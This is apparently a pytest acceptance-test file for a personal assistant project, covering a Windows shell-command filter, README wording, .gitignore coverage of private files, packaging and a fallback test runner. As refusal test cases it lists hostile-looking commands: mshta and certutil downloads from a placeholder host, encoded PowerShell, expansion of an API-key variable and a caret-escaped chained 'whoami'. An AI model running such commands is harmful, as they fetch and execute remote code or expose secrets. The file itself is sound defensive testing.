"""Acceptance tests: the audit's "small" items, pinned so they cannot come back.

Each one was found by running something, not by reading code, so each one is proven
the same way here:

* **BUG-2** - the shell filter was POSIX-shaped while the owner runs Windows 11, where
  ``cmd.exe`` expands ``%VAR%`` and ``!VAR!`` and ``powershell -Command ...`` is a shell
  inside the shell. Measured before the fix: ``echo %USERPROFILE%`` passed the filter.
* **BUG-5** - the README told the reader to unzip a file that does not exist.
* **BUG-6** - ``.gitignore`` did not cover the vault, ``workspace/`` or ``memory.db``,
  so a run inside the repo could commit the owner's memories.
* **Packaging** - ``packages = ["brain"]`` shipped no subpackages, so an installed
  ``brain`` command died with ``No module named 'brain.cli'``. Fixed, but nothing
  stopped it returning; this builds and installs the wheel for real.
* **BUG-4** - the fallback runner reported failures for passing tests.

Run:  python -m pytest tests/test_audit_hardening_acceptance.py -q
"""
from __future__ import annotations

import os
import pathlib
import subprocess
import sys
import zipfile

import pytest

ROOT = pathlib.Path(__file__).resolve().parents[1]


# --------------------------------------------------------------------------- #
# BUG-2: one plain command, on the platform the owner actually uses
# --------------------------------------------------------------------------- #
class _Ctx:
    """The smallest context `run_command` accepts, which records every ask."""

    def __init__(self, home: pathlib.Path):
        self.config = type("C", (), {"home": home})()
        self.calls: list = []
        self.permissions = self

    class _Decision:
        # the shape `_refusal` reads: a real Decision, not a bare object
        allowed = False
        reason = "not asked in this test"
        capability = "shell.run"
        scope = "test"
        prompt_id = "test-prompt"

    def request(self, *a, **k):
        self.calls.append(a)
        return self._Decision()

    def audit(self, *a, **k):
        pass


@pytest.mark.parametrize("command", [
    "echo %USERPROFILE%",          # cmd.exe expands it before the program runs
    "echo %GEMINI_API_KEY%",
    "echo hi !PATH!",              # delayed expansion
])
def test_the_windows_expansion_characters_are_refused(tmp_path, command):
    from brain.agent import host_tools

    ctx = _Ctx(tmp_path)
    out = host_tools.run_command(ctx, command=command)
    assert out["ok"] is False
    assert "expanded by the Windows shell" in out["error"]
    assert ctx.calls == [], "must be refused before the owner is even asked"


@pytest.mark.parametrize("command", [
    "powershell -Command Get-Process",
    "powershell.exe -enc ZQBjAGgAbwA=",
    "cmd /c dir",
    "bash -c 'ls'",
    "mshta http://example.com/x.hta",
    "certutil -urlcache -f http://example.com/x x.exe",
])
def test_a_shell_inside_the_shell_is_refused_by_name(tmp_path, command):
    """No metacharacter involved - which is why the character filter cannot catch it."""
    from brain.agent import host_tools

    ctx = _Ctx(tmp_path)
    out = host_tools.run_command(ctx, command=command)
    assert out["ok"] is False
    assert "runs OTHER commands" in out["error"]
    assert ctx.calls == []


def test_the_caret_escape_is_caught_by_the_metacharacter_rule(tmp_path):
    """`dir ^& whoami` is refused by the `&` rule (the caret only escapes it); the
    dedicated `^` rule is the belt to that braces, and both must refuse."""
    from brain.agent import host_tools

    ctx = _Ctx(tmp_path)
    out = host_tools.run_command(ctx, command="dir ^& whoami")
    assert out["ok"] is False and ctx.calls == []
    assert "^" in host_tools._CMD_EXPANSION


@pytest.mark.parametrize("command", ["echo hello", "dir", "ipconfig /all", "where python"])
def test_a_plain_command_still_reaches_the_owner_for_approval(tmp_path, command):
    from brain.agent import host_tools

    ctx = _Ctx(tmp_path)
    out = host_tools.run_command(ctx, command=command)
    # It reaches the permission gate (the owner is asked) and is then refused by this
    # test's own decision object - what matters is that the FILTER did not stop it.
    assert len(ctx.calls) == 1, ("a plain command must be put to the owner, not refused "
                                 f"by the filter: {out}")
    assert out["ok"] is False


# --------------------------------------------------------------------------- #
# BUG-5: the README names a file the reader actually has
# --------------------------------------------------------------------------- #
def test_the_readme_tells_the_reader_to_unzip_the_file_they_downloaded():
    text = (ROOT / "README.md").read_text(encoding="utf-8")
    assert "personal-brain-mvp.zip" not in text
    assert "cd personal-brain" not in text
    assert "unzip NILA_V02_STAGE" in text
    assert "cd Nila" in text


# --------------------------------------------------------------------------- #
# BUG-6: the vault is never committable
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("path", [
    "Nila/memory.db", "Nila/audit.log", "Nila/workspace/note.txt",
    "Nila/.personal-brain/identity.json", "Nila/vault_old/identity.json",
    "Nila/permissions.json", "Nila/device-key.dpapi",
    "Nila/build/x", "Nila/personal_brain.egg-info/x",
])
def test_private_files_cannot_be_committed(path):
    """Checked with git itself, so a rule in a file that does not apply is caught."""
    here = pathlib.Path(__file__).resolve().parents[2]
    inside = subprocess.run(["git", "rev-parse", "--is-inside-work-tree"], cwd=str(here),
                            capture_output=True, text=True)
    if inside.returncode != 0 or inside.stdout.strip() != "true":
        # An extracted ZIP is not a git work tree: there is nothing to commit, so there
        # is nothing to check. Skipping is honest here; the rule is still checked on
        # every run inside a checkout, which is where a commit could happen.
        pytest.skip("not inside a git work tree (an extracted copy), nothing to ignore")
    proc = subprocess.run(["git", "check-ignore", "-q", path], cwd=str(here))
    assert proc.returncode == 0, f"{path} is NOT ignored - a run inside the repo could commit it"


# --------------------------------------------------------------------------- #
# packaging: `pip install .` must ship the subpackages and both commands
# --------------------------------------------------------------------------- #
@pytest.mark.skipif(os.environ.get("NILA_SKIP_SLOW_PACKAGING") == "1",
                    reason="explicitly skipped with NILA_SKIP_SLOW_PACKAGING=1")
def test_an_installed_nila_imports_the_cli_it_installs(tmp_path):
    """The v0.1.0 bug: the wheel installed and `brain` did not run.

    ``packages = ["brain"]`` shipped the top level only, so the console script failed
    with ``No module named 'brain.cli'``. This builds the project the way a user's
    ``pip install .`` does and imports the two modules those scripts point at.
    """
    import shutil

    target = tmp_path / "site"
    try:
        import wheel  # noqa: F401   - setuptools needs it to build a wheel
    except ImportError:
        pytest.skip("the 'wheel' package is not installed, so no wheel can be built here")
    # `pip install <path>` leaves build/ and *.egg-info/ next to pyproject.toml, which is
    # exactly the litter that then ships inside a release ZIP (it did: 90 junk entries).
    # Copy the project to a scratch folder and install from THAT.
    project = tmp_path / "project"
    shutil.copytree(ROOT, project,
                    ignore=shutil.ignore_patterns(".git", "__pycache__", "build",
                                                  "dist", "*.egg-info", ".pytest_cache",
                                                  "tests"))
    proc = subprocess.run(
        [sys.executable, "-m", "pip", "install", "--no-deps", "--no-build-isolation",
         "--target", str(target), str(project)],
        capture_output=True, text=True, timeout=900)
    # A SKIP here would be a lie on a machine that has what is needed: the build
    # failing IS the v0.1.0 bug. Fail, and say what pip said.
    assert proc.returncode == 0, (proc.stdout[-800:] + proc.stderr[-1500:])

    probe = (
        "import sys; sys.path.insert(0, %r)\n"
        "import brain.cli.main, brain.agent.tools, brain.memory.store, brain.security.vaultkey\n"
        "print('ok')\n" % str(target)
    )
    out = subprocess.run([sys.executable, "-c", probe], capture_output=True, text=True,
                         cwd=str(tmp_path))
    assert out.returncode == 0, out.stderr[-800:]
    assert "ok" in out.stdout

    # and the console-script target is really in there
    assert (target / "brain" / "cli" / "main.py").is_file()
    bins = sorted(p.name for p in (target / "bin").iterdir()) if (target / "bin").is_dir() else []
    assert not bins or {"nila", "brain"} & set(bins), bins


def test_pyproject_uses_package_discovery_not_a_single_name():
    text = (ROOT / "pyproject.toml").read_text(encoding="utf-8")
    assert "[tool.setuptools.packages.find]" in text
    kept = [line for line in text.splitlines()
            if line.strip().startswith("packages = ")]
    assert kept == [], f"an explicit package list is the v0.1.0 bug: {kept}"
    assert 'include = ["brain", "brain.*"]' in text


# --------------------------------------------------------------------------- #
# BUG-4: the runner for machines without pytest does not invent failures
# --------------------------------------------------------------------------- #
def test_the_fallback_runner_reports_no_failures_on_a_module_that_passes(tmp_path):
    """Run it the way it is meant to run: with no pytest importable at all.

    Two defects were proven here: a `skipif` whose condition was a string was never
    honoured, and a fixture's teardown generator was advanced once instead of twice,
    so a monkeypatched clock stayed patched for every later test in the module.
    """
    fake = tmp_path / "nopytest"
    fake.mkdir()
    (fake / "pytest.py").write_text('raise ImportError("simulated: no pytest here")\n')
    env = dict(os.environ, PYTHONPATH=str(fake))
    out = subprocess.run([sys.executable, str(ROOT / "scripts" / "run_tests.py"),
                          "test_session_expiry"],
                         capture_output=True, text=True, env=env, cwd=str(ROOT), timeout=600)
    text = out.stdout + out.stderr
    assert "0 failed" in text, text[-1500:]
    assert "FAIL " not in text, text[-1500:]


def test_the_shim_honours_a_skipif_given_as_a_string():
    sys.path.insert(0, str(ROOT / "scripts"))
    try:
        import run_tests as runner

        shim = runner.Param()

        @shim.skipif("1 == 1", reason="always")
        def example():
            return "ran"

        assert getattr(example, "_nila_skip", None) == "always"
    finally:
        sys.path.remove(str(ROOT / "scripts"))
